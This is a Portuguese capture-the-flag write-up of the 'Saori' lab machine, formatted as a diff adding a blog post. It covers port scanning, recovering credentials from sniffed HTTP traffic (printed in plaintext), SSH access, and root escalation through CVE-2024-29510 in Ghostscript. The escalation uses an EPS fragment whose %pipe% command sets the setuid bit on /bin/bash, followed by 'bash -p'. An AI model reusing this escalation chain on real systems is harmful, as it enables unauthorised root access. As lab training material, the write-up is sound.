@@ -1,0 +1,103 @@
+---
+title: 'Saori Writeup'
+date: '2024-07-27'
+tags: ['CVE-2024-29510', 'Linux']
+draft: false
+summary: 'Writeup do CTF Saori da Hacking Club.'
+images: ['/static/images/saori-writeup-images/1.png']
+authors: ['default']
+---
+
+![Saori 1](/static/images/saori-writeup-images/1.png)
+
+## **Plataforma**: Hacking Club
+
+### **Dificuldade:** Easy
+
+### **Nome**: Saori
+
+### IP: 172.16.4.216
+
+---
+
+### Port Scanning
+
+`nmap -sV -sC -p- -v $IP --open`
+
+```bash
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   256 da:cf:66:16:98:0d:7c:69:17:3a:09:dc:a1:c1:1e:cd (ECDSA)
+|_  256 0c:31:6e:b6:4a:88:39:35:72:02:1b:6b:fa:df:44:91 (ED25519)
+80/tcp open  http    Apache httpd 2.4.58
+| http-methods:
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-title: Blog
+|_http-server-header: Apache/2.4.58 (Ubuntu)
+Service Info: Host: ip-172-16-4-216.ec2.internal; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+Somente as portas 22 (SSH) e 80 (HTTP) estão abertas.
+
+## Enumeration
+
+`sudo vim /etc/hosts`
+![Saori 2](/static/images/saori-writeup-images/2.png)
+
+![Saori 3](/static/images/saori-writeup-images/3.png)
+
+Depois de baixar o client, a gente executa ele e captura o trafego com o wireshark.
+
+`chmod +x client`
+`./client`
+
+Quando executamos ele baixa um arquivo chamado `game.sfc`
+![Saori 4](/static/images/saori-writeup-images/4.png)
+
+Interceptei o download do game.sfc com wireshark:
+![Saori 5](/static/images/saori-writeup-images/5.png)
+
+![Saori 6](/static/images/saori-writeup-images/6.png)
+Achamos as credenciais do user abner no campo authorization do HTTP capturado pelo wireshark.
+Credentials: `abner:m0V55O1qm78MyEluU`
+
+## Foot Hold
+
+`ssh abner@172.16.4.216`
+![Saori 7](/static/images/saori-writeup-images/7.png)
+
+---
+
+## Privillege Escalation
+
+`sudo -l`
+![Saori 8](/static/images/saori-writeup-images/8.png)
+
+Essa versão do gs tem uma CVE:
+`gs --version`
+![Saori 9](/static/images/saori-writeup-images/9.png)
+
+[https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/](https://codeanlabs.com/blog/research/cve-2024-29510-ghostscript-format-string-exploitation/)
+A CVE original executa a calculadora do gnome , basta alterar pro comando que a gente quiser.
+
+```python
+% And now `path_control_active` == 0, so we can use %pipe%
+
+(%pipe%chmod u+s /bin/bash) (r) file
+
+quit
+```
+
+`sudo /usr/local/bin/gs -q -dNODISPLAY -dBATCH -dSAFER /root/../tmp/exploit.eps`
+![Saori 10](/static/images/saori-writeup-images/10.png)
+
+`bash -p`
+![Saori 11](/static/images/saori-writeup-images/11.png)
+
+---
+
+## Proof
+
+![Saori 12](/static/images/saori-writeup-images/12.png)
